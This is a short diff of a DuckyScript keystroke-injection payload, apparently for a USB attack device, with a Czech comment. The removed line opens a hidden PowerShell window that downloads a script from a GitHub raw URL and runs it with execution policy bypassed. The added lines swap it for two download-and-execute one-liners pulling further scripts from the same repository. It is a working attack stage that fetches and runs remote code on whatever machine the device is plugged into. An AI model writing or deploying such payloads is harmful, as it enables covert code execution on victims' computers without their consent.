@@ -16,5 +16,6 @@ ALT y
 DELAY 1000
 
 REM Stáhne soubor a spustí ho s vypnutou execution policy
-STRING powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra.ps1' -OutFile $env:TEMP\payload.ps1; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File `\"$env:TEMP\payload.ps1`\"'"
+STRING iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra.ps1")
+STRING iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Volkswagen.ps1")
 ENTER
